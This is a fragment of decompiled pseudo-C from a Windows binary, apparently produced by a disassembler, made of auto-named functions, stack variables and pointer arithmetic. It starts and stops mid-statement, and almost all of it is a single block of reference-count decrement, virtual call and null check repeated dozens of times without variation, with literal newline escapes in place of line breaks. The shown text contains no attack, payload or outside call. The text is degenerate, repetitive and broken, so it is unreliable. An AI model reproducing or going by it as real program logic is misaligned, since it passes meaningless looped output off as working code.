= *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar7 == 1 || iVar7 + -1 < 0) {\n                    (**(**(in_stack_fffff194 + -0x10) + 4))(in_stack_fffff194 + -0x10, iVar5);\n                }\n                piVar6 = fcn.0042407a();\n                if (piVar6 == NULL) goto code_r0x0040f1c8;\n                (**(*piVar6 + 0xc))();\n                iVar5 = 0x52e800;\n                iVar7 = fcn.00423f8f();\n                if (iVar7 != 0) {\n                    fcn.0040f770(iVar7);\n                    iVar5 = iVar7;\n                }\n                uStack4 = 0xffffffff;\n                piVar6 = in_stack_fffff194 + -4;\n                LOCK();\n                iVar7 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar7 == 1 || iVar7 + -1 < 0) {\n                    (**(**(in_stack_fffff194 + -0x10) + 4))(in_stack_fffff194 + -0x10, iVar5);\n                }\n                piVar6 = fcn.0042407a();\n                if (piVar6 == NULL) goto code_r0x0040f1c8;\n                (**(*piVar6 + 0xc))();\n                iVar5 = 0x52e800;\n                iVar7 = fcn.00423f8f();\n                if (iVar7 != 0) {\n                    fcn.0040f770(iVar7);\n                    iVar5 = iVar7;\n                }\n                uStack4 = 0xffffffff;\n                piVar6 = in_stack_fffff194 + -4;\n                LOCK();\n                iVar7 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar7 == 1 || iVar7 + -1 < 0) {\n                    (**(**(in_stack_fffff194 + -0x10) + 4))(in_stack_fffff194 + -0x10, iVar5);\n                }\n                piVar6 = fcn.0042407a();\n                if (piVar6 == NULL) goto code_r0x0040f1c8;\n                (**(*piVar6 + 0xc))();\n                iVar5 = 0x52e800;\n                iVar7 = fcn.00423f8f();\n                if (iVar7 != 0) {\n                    fcn.0040f770(iVar7);\n                    iVar5 = iVar7;\n                }\n                uStack4 = 0xffffffff;\n                piVar6 = in_stack_fffff194 + -4;\n                LOCK();\n                iVar7 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar7 == 1 || iVar7 + -1 < 0) {\n                    (**(**(in_stack_fffff194 + -0x10) + 4))(in_stack_fffff194 + -0x10, iVar5);\n                }\n                piVar6 = fcn.0042407a();\n                if (piVar6 == NULL) goto code_r0x0040f1c8;\n                (**(*piVar6 + 0xc))();\n                iVar5 = 0x52e800;\n                iVar7 = fcn.00423f8f();\n                if (iVar7 != 0) {\n                    fcn.0040f770(iVar7);\n                    iVar5 = iVar7;\n                }\n                uStack4 = 0xffffffff;\n                piVar6 = in_stack_fffff194 + -4;\n                LOCK();\n                iVar7 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar7 == 1 || iVar7 + -1 < 0) {\n                    (**(**(in_stack_fffff194 + -0x10) + 4))(in_stack_fffff194 + -0x10, iVar5);\n                }\n                piVar6 = fcn.0042407a();\n                if (piVar6 == NULL) goto code_r0x0040f1c8;\n                (**(*piVar6 + 0xc))();\n                iVar5 = 0x52e800;\n                iVar7 = fcn.00423f8f();\n                if (iVar7 != 0) {\n                    fcn.0040f770(iVar7);\n                    iVar5 = iVar7;\n                }\n                uStack4 = 0xffffffff;\n                piVar6 = in_stack_fffff194 + -4;\n                LOCK();\n                iVar7 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar7 == 1 || iVar7 + -1 < 0) {\n                    (**(**(in_stack_fffff194 + -0x10) + 4))(in_stack_fffff194 + -0x10, iVar5);\n                }\n                piVar6 = fcn.0042407a();\n                if (piVar6 == NULL) goto code_r0x0040f1c8;\n                (**(*piVar6 + 0xc))();\n                iVar5 = 0x52e800;\n                iVar7 = fcn.00423f8f();\n                if (iVar7 != 0) {\n                    fcn.0040f770(iVar7);\n                    iVar5 = iVar7;\n                }\n                uStack4 = 0xffffffff;\n                piVar6 = in_stack_fffff194 + -4;\n                LOCK();\n                iVar7 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar7 == 1 || iVar7 + -1 < 0) {\n                    (**(**(in_stack_fffff194 + -0x10) + 4))(in_stack_fffff194 + -0x10, iVar5);\n                }\n                piVar6 = fcn.0042407a();\n                if (piVar6 == NULL) goto code_r0x0040f1c8;\n                (**(*piVar6 + 0xc))();\n                iVar5 = 0x52e800;\n                iVar7 = fcn.00423f8f();\n                if (iVar7 != 0) {\n                    fcn.0040f770(iVar7);\n                    iVar5 = iVar7;\n                }\n                uStack4 = 0xffffffff;\n                piVar6 = in_stack_fffff194 + -4;\n                LOCK();\n                iVar7 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar7 == 1 || iVar7 + -1 < 0) {\n                    (**(**(in_stack_fffff194 + -0x10) + 4))(in_stack_fffff194 + -0x10, iVar5);\n                }\n                piVar6 = fcn.0042407a();\n                if (piVar6 == NULL) goto code_r0x0040f1c8;\n                (**(*piVar6 + 0xc))();\n                iVar5 = 0x52e800;\n                iVar7 = fcn.00423f8f();\n                if (iVar7 != 0) {\n                    fcn.0040f770(iVar7);\n                    iVar5 = iVar7;\n                }\n                uStack4 = 0xffffffff;\n                piVar6 = in_stack_fffff194 + -4;\n                LOCK();\n                iVar7 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar7 == 1 || iVar7 + -1 < 0) {\n                    (**(**(in_stack_fffff194 + -0x10) + 4))(in_stack_fffff194 + -0x10, iVar5);\n                }\n                piVar6 = fcn.0042407a();\n                if (piVar6 == NULL) goto code_r0x0040f1c8;\n                (**(*piVar6 + 0xc))();\n                iVar5 = 0x52e800;\n                iVar7 = fcn.00423f8f();\n                if (iVar7 != 0) {\n                    fcn.0040f770(iVar7);\n                    iVar5 = iVar7;\n                }\n                uStack4 = 0xffffffff;\n                piVar6 = in_stack_fffff194 + -4;\n                LOCK();\n                iVar7 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar7 == 1 || iVar7 + -1 < 0) {\n                    (**(**(in_stack_fffff194 + -0x10) + 4))(in_stack_fffff194 + -0x10, iVar5);\n                }\n                piVar6 = fcn.0042407a();\n                if (piVar6 == NULL) goto code_r0x0040f1c8;\n                (**(*piVar6 + 0xc))();\n                iVar5 = 0x52e800;\n                iVar7 = fcn.00423f8f();\n                if (iVar7 != 0) {\n                    fcn.0040f770(iVar7);\n                    iVar5 = iVar7;\n                }\n                uStack4 = 0xffffffff;\n                piVar6 = in_stack_fffff194 + -4;\n                LOCK();\n                iVar7 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar7 == 1 || iVar7 + -1 < 0) {\n                    (**(**(in_stack_fffff194 + -0x10) + 4))(in_stack_fffff194 + -0x10, iVar5);\n                }\n                piVar6 = fcn.0042407a();\n                if (piVar6 == NULL) goto code_r0x0040f1c8;\n                (**(*piVar6 + 0xc))();\n                iVar5 = 0x52e800;\n                iVar7 = fcn.00423f8f();\n                if (iVar7 != 0) {\n                    fcn.0040f770(iVar7);\n                    iVar5 = iVar7;\n                }\n                uStack4 = 0xffffffff;\n                piVar6 = in_stack_fffff194 + -4;\n                LOCK();\n                iVar7 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar7 == 1 || iVar7 + -1 < 0) {\n                    (**(**(in_stack_fffff194 + -0x10) + 4))(in_stack_fffff194 + -0x10, iVar5);\n                }\n                piVar6 = fcn.0042407a();\n                if (piVar6 == NULL) goto code_r0x0040f1c8;\n                (**(*piVar6 + 0xc))();\n                iVar5 = 0x52e800;\n                iVar7 = fcn.00423f8f();\n                if (iVar7 != 0) {\n                    fcn.0040f770(iVar7);\n                    iVar5 = iVar7;\n                }\n                uStack4 = 0xffffffff;\n                piVar6 = in_stack_fffff194 + -4;\n                LOCK();\n                iVar7 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar7 == 1 || iVar7 + -1 < 0) {\n                    (**(**(in_stack_fffff194 + -0x10) + 4))(in_stack_fffff194 + -0x10, iVar5);\n                }\n                piVar6 = fcn.0042407a();\n                if (piVar6 == NULL) goto code_r0x0040f1c8;\n                (**(*piVar6 + 0xc))();\n                iVar5 = 0x52e800;\n                iVar7 = fcn.00423f8f();\n                if (iVar7 != 0) {\n                    fcn.0040f770(iVar7);\n                    iVar5 = iVar7;\n                }\n                uStack4 = 0xffffffff;\n                piVar6 = in_stack_fffff194 + -4;\n                LOCK();\n                iVar7 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar7 == 1 || iVar7 + -1 < 0) {\n                    (**(**(in_stack_fffff194 + -0x10) + 4))(in_stack_fffff194 + -0x10, iVar5);\n                }\n                piVar6 = fcn.0042407a();\n                if (piVar6 == NULL) goto code_r0x0040f1c8;\n                (**(*piVar6 + 0xc))();\n                iVar5 = 0x52e800;\n                iVar7 = fcn.00423f8f();\n                if (iVar7 != 0) {\n                    fcn.0040f770(iVar7);\n                    iVar5 = iVar7;\n                }\n                uStack4 = 0xffffffff;\n                piVar6 = in_stack_fffff194 + -4;\n                LOCK();\n                iVar7 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar7 == 1 || iVar7 + -1 < 0) {\n                    (**(**(in_stack_fffff194 + -0x10) + 4))(in_stack_fffff194 + -0x10, iVar5);\n                }\n                piVar6 = fcn.0042407a();\n                if (piVar6 == NULL) goto code_r0x0040f1c8;\n                (**(*piVar6 + 0xc))();\n                iVar5 = 0x52e800;\n                iVar7 = fcn.00423f8f();\n                if (iVar7 != 0) {\n                    fcn.0040f770(iVar7);\n                    iVar5 = iVar7;\n                }\n                uStack4 = 0xffffffff;\n                piVar6 = in_stack_fffff194 + -4;\n                LOCK();\n                iVar7 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar7 == 1 || iVar7 + -1 < 0) {\n                    (**(**(in_stack_fffff194 + -0x10) + 4))(in_stack_fffff194 + -0x10, iVar5);\n                }\n                piVar6 = fcn.0042407a();\n                if (piVar6 == NULL) goto code_r0x0040f1c8;\n                (**(*piVar6 + 0xc))();\n                iVar5 = 0x52e800;\n                iVar7 = fcn.00423f8f();\n                if (iVar7 != 0) {\n                    fcn.0040f770(iVar7);\n                    iVar5 = iVar7;\n                }\n                uStack4 = 0xffffffff;\n                piVar6 = in_stack_fffff194 + -4;\n                LOCK();\n                iVar7 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar7 == 1 || iVar7 + -1 < 0) {\n                    (**(**(in_stack_fffff194 + -0x10) + 4))(in_stack_fffff194 + -0x10, iVar5);\n                }\n                piVar6 = fcn.0042407a();\n                if (piVar6 == NULL) goto code_r0x0040f1c8;\n                (**(*piVar6 + 0xc))();\n                iVar5 = 0x52e800;\n                iVar7 = fcn.00423f8f();\n                if (iVar7 != 0) {\n                    fcn.0040f770(iVar7);\n                    iVar5 = iVar7;\n                }\n                uStack4 = 0xffffffff;\n                piVar6 = in_stack_fffff194 + -4;\n                LOCK();\n                iVar7 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar7 == 1 || iVar7 + -1 < 0) {\n                    (**(**(in_stack_fffff194 + -0x10) + 4))(in_stack_fffff194 + -0x10, iVar5);\n                }\n                piVar6 = fcn.0042407a();\n                if (piVar6 == NULL) goto code_r0x0040f1c8;\n                (**(*piVar6 + 0xc))();\n                iVar5 = 0x52e800;\n                iVar7 = fcn.00423f8f();\n                if (iVar7 != 0) {\n                    fcn.0040f770(iVar7);\n                    iVar5 = iVar7;\n                }\n                uStack4 = 0xffffffff;\n                piVar6 = in_stack_fffff194 + -4;\n                LOCK();\n                iVar7 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar7 == 1 || iVar7 + -1 < 0) {\n                    (**(**(in_stack_fffff194 + -0x10) + 4))(in_stack_fffff194 + -0x10, iVar5);\n                }\n                piVar6 = fcn.0042407a();\n                if (piVar6 == NULL) goto code_r0x0040f1c8;\n                (**(*piVar6 + 0xc))();\n                iVar5 = 0x52e800;\n                iVar7 = fcn.00423f8f();\n                if (iVar7 != 0) {\n                    fcn.0040f770(iVar7);\n                    iVar5 = iVar7;\n                }\n                uStack4 = 0xffffffff;\n                piVar6 = in_stack_fffff194 + -4;\n                LOCK();\n                iVar7 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar7 == 1 || iVar7 + -1 < 0) {\n                    (**(**(in_stack_fffff194 + -0x10) + 4))(in_stack_fffff194 + -0x10, iVar5);\n                }\n                piVar6 = fcn.0042407a();\n                if (piVar6 == NULL) goto code_r0x0040f1c8;\n                (**(*piVar6 + 0xc))();\n                iVar5 = 0x52e800;\n                iVar7 = fcn.00423f8f();\n                if (iVar7 != 0) {\n                    fcn.0040f770(iVar7);\n                    iVar5 = iVar7;\n                }\n                uStack4 = 0xffffffff;\n                piVar6 = in_stack_fffff194 + -4;\n                LOCK();\n                iVar7 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar7 == 1 || iVar7 + -1 < 0) {\n                    (**(**(in_stack_fffff194 + -0x10) + 4))(in_stack_fffff194 + -0x10, iVar5);\n                }\n                piVar6 = fcn.0042407a();\n                if (piVar6 == NULL) goto code_r0x0040f1c8;\n                (**(*piVar6 + 0xc))();\n                iVar5 = 0x52e800;\n                iVar7 = fcn.00423f8f();\n                if (iVar7 != 0) {\n                    fcn.0040f770(iVar7);\n                    iVar5 = iVar7;\n                }\n                uStack4 = 0xffffffff;\n                piVar6 = in_stack_fffff194 + -4;\n                LOCK();\n                iVar7 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar7 == 1 || iVar7 + -1 < 0) {\n                    (**(**(in_stack_fffff194 + -0x10) + 4))(in_stack_fffff194 + -0x10, iVar5);\n                }\n                piVar6 = fcn.0042407a();\n                if (piVar6 == NULL) goto code_r0x0040f1c8;\n                (**(*piVar6 + 0xc))();\n                iVar5 = 0x52e800;\n                iVar7 = fcn.00423f8f();\n                if (iVar7 != 0) {\n                    fcn.0040f770(iVar7);\n                    iVar5 = iVar7;\n                }\n                uStack4 = 0xffffffff;\n                piVar6 = in_stack_fffff194 + -4;\n                LOCK();\n                iVar7 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar7 == 1 || iVar7 + -1 < 0) {\n                    (**(**(in_stack_fffff194 + -0x10) + 4))(in_stack_fffff194 + -0x10, iVar5);\n                }\n                piVar6 = fcn.0042407a();\n                if (piVar6 == NULL) goto code_r0x0040f1c8;\n                (**(*piVar6 + 0xc))();\n                iVar5 = 0x52e800;\n                iVar7 = fcn.00423f8f();\n                if (iVar7 != 0) {\n                    fcn.0040f770(iVar7);\n                    iVar5 = iVar7;\n                }\n                uStack4 = 0xffffffff;\n                piVar6 = in_stack_fffff194 + -4;\n                LOCK();\n                iVar7 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar7 == 1 || iVar7 + -1 < 0) {\n                    (**(**(in_stack_fffff194 + -0x10) + 4))(in_stack_fffff194 + -0x10, iVar5);\n                }\n                piVar6 = fcn.0042407a();\n                if (piVar6 == NULL) goto code_r0x0040f1c8;\n                (**(*piVar6 + 0xc))();\n                iVar5 = 0x52e800;\n                iVar7 = fcn.00423f8f();\n                if (iVar7 != 0) {\n                    fcn.0040f770(iVar7);\n                    iVar5 = iVar7;\n                }\n                uStack4 = 0xffffffff;\n                piVar6 = in_stack_fffff194 + -4;\n                LOCK();\n                iVar7 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar7 == 1 || iVar7 + -1 < 0) {\n                    (**(**(in_stack_fffff194 + -0x10) + 4))(in_stack_fffff194 + -0x10, iVar5);\n                }\n                piVar6 = fcn.0042407a();\n                if (piVar6 == NULL) goto code_r0x0040f1c8;\n                (**(*piVar6 + 0xc))();\n                iVar5 = 0x52e800;\n                iVar7 = fcn.00423f8f();\n                if (iVar7 != 0) {\n                    fcn.0040f770(iVar7);\n                    iVar5 = iVar7;\n                }\n                uStack4 = 0xffffffff;\n                piVar6 = in_stack_fffff194 + -4;\n                LOCK();\n                iVar7 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar7 == 1 || iVar7 + -1 < 0) {\n                    (**(**(in_stack_fffff194 + -0x10) + 4))(in_stack_fffff194 + -0x10, iVar5);\n                }\n                piVar6 = fcn.0042407a();\n                if (piVar6 == NULL) goto code_r0x0040f1c8;\n                (**(*piVar6 + 0xc))();\n                iVar5 = 0x52e800;\n                iVar7 = fcn.00423f8f();\n                if (iVar7 != 0) {\n                    fcn.0040f770(iVar7);\n                    iVar5 = iVar7;\n                }\n                uStack4 = 0xffffffff;\n                piVar6 = in_stack_fffff194 + -4;\n                LOCK();\n                iVar7 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar7 == 1 || iVar7 + -1 < 0) {\n                    (**(**(in_stack_fffff194 + -0x10) + 4))(in_stack_fffff194 + -0x10, iVar5);\n                }\n                piVar6 = fcn.0042407a();\n                if (piVar6 == NULL) goto code_r0x0040f1c8;\n                (**(*piVar6 + 0xc))();\n                iVar5 = 0x52e800;\n                iVar7 = fcn.00423f8f();\n                if (iVar7 != 0) {\n                    fcn.0040f770(iVar7);\n                    iVar5 = iVar7;\n                }\n                uStack4 = 0xffffffff;\n                piVar6 = in_stack_fffff194 + -4;\n                LOCK();\n                iVar7 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar7 == 1 || iVar7 + -1 < 0) {\n                    (**(**(in_stack_fffff194 + -0x10) + 4))(in_stack_fffff194 + -0x10, iVar5);\n                }\n                piVar6 = fcn.0042407a();\n                if (piVar6 == NULL) goto code_r0x0040f1c8;\n                (**(*piVar6 + 0xc))();\n                iVar5 = 0x52e800;\n                iVar7 = fcn.00423f8f();\n                if (iVar7 != 0) {\n                    fcn.0040f770(iVar7);\n                    iVar5 = iVar7;\n                }\n                uStack4 = 0xffffffff;\n                piVar6 = in_stack_fffff194 + -4;\n                LOCK();\n                iVar7 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar7 == 1 || iVar7 + -1 < 0) {\n                    (**(**(in_stack_fffff194 + -0x10) + 4))(in_stack_fffff194 + -0x10, iVar5);\n                }\n                piVar6 = fcn.0042407a();\n                if (piVar6 == NULL) goto code_r0x0040f1c8;\n                (**(*piVar6 + 0xc))();\n                iVar5 = 0x52e800;\n                iVar7 = fcn.00423f8f();\n                if (iVar7 != 0) {\n                    fcn.0040f770(iVar7);\n                    iVar5 = iVar7;\n                }\n                uStack4 = 0xffffffff;\n                piVar6 = in_stack_fffff194 + -4;\n                LOCK();\n                iVar7 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar7 == 1 || iVar7 + -1 < 0) {\n                    (**(**(in_stack_fffff194 + -0x10) + 4))(in_stack_fffff194 + -0x10, iVar5);\n                }\n                piVar6 = fcn.0042407a();\n                if (piVar6 == NULL) goto code_r0x0040f1c8;\n                (**(*piVar6 + 0xc))();\n                iVar5 = 0x52e800;\n                iVar7 = fcn.00423f8f();\n                if (iVar7 != 0) {\n                    fcn.0040f770(iVar7);\n                    iVar5 = iVar7;\n                }\n                uStack4 = 0xffffffff;\n                piVar6 = in_stack_fffff194 + -4;\n                LOCK();\n                iVar7 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar7 == 1 || iVar7 + -1 < 0) {\n                    (**(**(in_stack_fffff194 + -0x10) + 4))(in_stack_fffff194 + -0x10, iVar5);\n                }\n                piVar6 = fcn.0042407a();\n                if (piVar6 == NULL) goto code_r0x0040f1c8;\n                (**(*piVar6 + 0xc))();\n                iVar5 = 0x52e800;\n                iVar7 = fcn.00423f8f();\n                if (iVar7 != 0) {\n                    fcn.0040f770(iVar7);\n                    iVar5 = iVar7;\n                }\n                uStack4 = 0xffffffff;\n                piVar6 = in_stack_fffff194 + -4;\n                LOCK();\n                iVar7 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar7 == 1 || iVar7 + -1 < 0) {\n                    (**(**(in_stack_fffff194 + -0x10) + 4))(in_stack_fffff194 + -0x10, iVar5);\n                }\n                piVar6 = fcn.0042407a();\n                if (piVar6 == NULL) goto code_r0x0040f1c8;\n                (**(*piVar6 + 0xc))();\n                iVar5 = 0x52e800;\n                iVar7 = fcn.00423f8f();\n                if (iVar7 != 0) {\n                    fcn.0040f770(iVar7);\n                    iVar5 = iVar7;\n                }\n                uStack4 = 0xffffffff;\n                piVar6 = in_stack_fffff194 + -4;\n                LOCK();\n                iVar7 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar7 == 1 || iVar7 + -1 < 0) {\n                    (**(**(in_stack_fffff194 + -0x10) + 4))(in_stack_fffff194 + -0x10, iVar5);\n                }\n                piVar6 = fcn.0042407a();\n                if (piVar6 == NULL) goto code_r0x0040f1c8;\n                (**(*piVar6 + 0xc))();\n                iVar5 = 0x52e800;\n                iVar7 = fcn.00423f8f();\n                if (iVar7 != 0) {\n                    fcn.0040f770(iVar7);\n                    iVar5 = iVar7;\n                }\n                uStack4 = 0xffffffff;\n                piVar6 = in_stack_fffff194 + -4;\n                LOCK();\n                iVar7 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar7 == 1 || iVar7 + -1 < 0) {\n                    (**(**(in_stack_fffff194 + -0x10) + 4))(in_stack_fffff194 + -0x10, iVar5);\n                }\n                piVar6 = fcn.0042407a();\n                if (piVar6 == NULL) goto code_r0x0040f1c8;\n                (**(*piVar6 + 0xc))();\n                iVar5 = 0x52e800;\n                iVar7 = fcn.00423f8f();\n                if (iVar7 != 0) {\n                    fcn.0040f770(iVar7);\n                    iVar5 = iVar7;\n                }\n                uStack4 = 0xffffffff;\n                piVar6 = in_stack_fffff194 + -4;\n                LOCK();\n                iVar7 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar7 == 1 || iVar7 + -1 < 0) {\n                    (**(**(in_stack_fffff194 + -0x10) + 4))(in_stack_fffff194 + -0x10, iVar5);\n                }\n                piVar6 = fcn.0042407a();\n                if (piVar6 == NULL) goto code_r0x0040f1c8;\n                (**(*piVar6 + 0xc))();\n                iVar5 = 0x52e800;\n                iVar7 = fcn.00423f8f();\n                if (iVar7 != 0) {\n                    fcn.0040f770(iVar7);\n                    iVar5 = iVar7;\n                }\n                uStack4 = 0xffffffff;\n                piVar6 = in_stack_fffff194 + -4;\n                LOCK();\n                iVar7 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar7 == 1 || iVar7 + -1 < 0) {\n                    (**(**(in_stack_fffff194 + -0x10) + 4))(in_stack_fffff194 + -0x10, iVar5);\n                }\n                piVar6 = fcn.0042407a();\n                if (piVar6 == NULL) goto code_r0x0040f1c8;\n                (**(*piVar6 + 0xc))();\n                iVar5 = 0x52e800;\n                iVar7 = fcn.00423f8f();\n                if (iVar7 != 0) {\n                    fcn.0040f770(iVar7);\n                    iVar5 = iVar7;\n                }\n                uStack4 = 0xffffffff;\n                piVar6 = in_stack_fffff194 + -4;\n                LOCK();\n                iVar7 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar7 == 1 || iVar7 + -1 < 0) {\n                    (**(**(in_stack_fffff194 + -0x10) + 4))(in_stack_fffff194 + -0x10, iVar5);\n                }\n                piVar6 = fcn.0042407a();\n                if (piVar6 == NULL) goto code_r0x0040f1c8;\n                (**(*piVar6 + 0xc))();\n                iVar5 = 0x52e800;\n                iVar7 = fcn.00423f8f();\n                if (iVar7 != 0) {\n                    fcn.0040f770(iVar7);\n                    iVar5 = iVar7;\n                }\n                uStack4 = 0xffffffff;\n                piVar6 = in_stack_fffff194 + -4;\n                LOCK();\n                iVar7 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar7 == 1 || iVar7 + -1 < 0) {\n                    (**(**(in_stack_fffff194 + -0x10) + 4))(in_stack_fffff194 + -0x10, iVar5);\n                }\n                piVar6 = fcn.0042407a();\n                if (piVar6 == NULL) goto code_r0x0040f1c8;\n                (**(*piVar6 + 0xc))();\n                iVar5 = 0x52e800;\n                iVar7 = fcn.00423f8f();\n                if (iVar7 != 0) {\n                    fcn.0040f770(iVar7);\n                    iVar5 = iVar7;\n                }\n                uStack4 = 0xffffffff;\n                piVar6 = in_stack_fffff194 + -4;\n                LOCK();\n                iVar7 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar7 == 1 || iVar7 + -1 < 0) {\n                    (**(**(in_stack_fffff194 + -0x10) + 4))(in_stack_fffff194 + -0x10, iVar5);\n                }\n                piVar6 = fcn.0042407a();\n                if (piVar6 == NULL) goto code_r0x0040f1c8;\n                (**(*piVar6 + 0xc))();\n                iVar5 = 0x52e800;\n                iVar7 = fcn.00423f8f();\n                if (iVar7 != 0) {\n                    fcn.0040f770(iVar7);\n                    iVar5 = iVar7;\n                }\n                uStack4 = 0xffffffff;\n                piVar6 = in_stack_fffff194 + -4;\n                LOCK();\n                iVar7 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar7 == 1 || iVar7 + -1 < 0) {\n                    (**(**(in_stack_fffff194 + -0x10) + 4))(in_stack_fffff194 + -0x10, iVar5);\n                }\n                piVar6 = fcn.0042407a();\n                if (piVar6 == NULL) goto code_r0x0040f1c8;\n                (**(*piVar6 + 0xc))();\n                iVar5 = 0x52e800;\n                iVar7 = fcn.00423f8f();\n                if (iVar7 != 0) {\n                    fcn.0040f770(iVar7);\n                    iVar5 = iVar7;\n                }\n                uStack4 = 0xffffffff;\n                piVar6 = in_stack_fffff194 + -4;\n                LOCK();\n                iVar7 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar7 == 1 || iVar7 + -1 < 0) {\n                    (**(**(in_stack_fffff194 + -0x10) + 4))(in_stack_fffff194 + -0x10, iVar5);\n                }\n                piVar6 = fcn.0042407a();\n                if (piVar6 == NULL) goto code_r0x0040f1c8;\n                (**(*piVar6 + 0xc))();\n                iVar5 = 0x52e800;\n                iVar7 = fcn.00423f8f();\n                if (iVar7 != 0) {\n                    fcn.0040f770(iVar7);\n                    iVar5 = iVar7;\n                }\n                uStack4 = 0xffffffff;\n                piVar6 = in_stack_fffff194 + -4;\n                LOCK();\n                iVar7 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar7 == 1 || iVar7 + -1 < 0) {\n                    (**(**(in_stack_fffff194 + -0x10) + 4))(in_stack_fffff194 + -0x10, iVar5);\n                }\n                piVar6 = fcn.0042407a();\n                if (piVar6 == NULL) goto code_r0x0040f1c8;\n                (**(*piVar6 + 0xc))();\n                iVar5 = 0x52e800;\n                iVar7 = fcn.00423f8f();\n                if (iVar7 != 0) {\n                    fcn.0040f770(iVar7);\n                    iVar5 = iVar7;\n                }\n                uStack4 = 0xffffffff;\n                piVar6 = in_stack_fffff194 + -4;\n                LOCK();\n                iVar7 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar7 == 1 || iVar7 + -1 < 0) {\n                    (**(**(in_stack_fffff194 + -0x10) + 4))(in_stack_fffff194 + -0x10, iVar5);\n                }\n                piVar6 = fcn.0042407a();\n                if (piVar6 == NULL) goto code_r0x0040f1c8;\n                (**(*piVar6 + 0xc))();\n                iVar5 = 0x52e800;\n                iVar7 = fcn.00423f8f();\n                if (iVar7 != 0) {\n                    fcn.0040f770(iVar7);\n                    iVar5 = iVar7;\n                }\n                uStack4 = 0xffffffff;\n                piVar6 = in_stack_fffff194 + -4;\n                LOCK();\n                iVar7 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar7 == 1 || iVar7 + -1 < 0) {\n                    (**(**(in_stack_fffff194 + -0x10) + 4))(in_stack_fffff194 + -0x10, iVar5);\n                }\n                piVar6 = fcn.0042407a();\n                if (piVar6 == NULL) goto code_r0x0040f1c8;\n                (**(*piVar6 + 0xc))();\n                iVar5 = 0x52e800;\n                iVar7 = fcn.00423f8f();\n                if (iVar7 != 0) {\n                    fcn.0040f770(iVar7);\n                    iVar5 = iVar7;\n                }\n                uStack4 = 0xffffffff;\n                piVar6 = in_stack_fffff194 + -4;\n                LOCK();\n                iVar7 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar7 == 1 || iVar7 + -1 < 0) {\n                    (**(**(in_stack_fffff194 + -0x10) + 4))(in_stack_fffff194 + -0x10, iVar5);\n                }\n                piVar6 = fcn.0042407a();\n                if (piVar6 == NULL) goto code_r0x0040f1c8;\n                (**(*piVar6 + 0xc))();\n                iVar5 = 0x52e800;\n                iVar7 = fcn.00423f8f();\n                if (iVar7 != 0) {\n                    fcn.0040f770(iVar7);\n                    iVar5 = iVar7;\n                }\n                uStack4 = 0xffffffff;\n                piVar6 = in_stack_fffff194 + -4;\n                LOCK();\n                iVar7 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar7 == 1 || iVar7 + -1 < 0) {\n                    (**(**(in_stack_fffff194 + -0x10) + 4))(in_stack_fffff194 + -0x10, iVar5);\n                }\n                piVar6 = fcn.0042407a();\n                if (piVar6 == NULL) goto code_r0x0040f1c8;\n                (**(*piVar6 + 0xc))();\n                iVar5 = 0x52e800;\n                iVar7 = fcn.00423f8f();\n                if (iVar7 != 0) {\n                    fcn.0040f770(iVar7);\n                    iVar5 = iVar7;\n                }\n                uStack4 = 0xffffffff;\n                piVar6 = in_stack_fffff194 + -4;\n                LOCK();\n                iVar7 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar7 == 1 || iVar7 + -1 < 0) {\n                    (**(**(in_stack_fffff194 + -0x10) + 4))(in_stack_fffff194 + -0x10, iVar5);\n                }\n                piVar6 = fcn.0042407a();\n                if (piVar6 == NULL) goto code_r0x0040f1c8;\n                (**(*piVar6 + 0xc))();\n                iVar5 = 0x52e800;\n                iVar7 = fcn.00423f8f();\n                if (iVar7 != 0) {\n                    fcn.0040f770(iVar7);\n                    iVar5 = iVar7;\n                }\n                uStack4 = 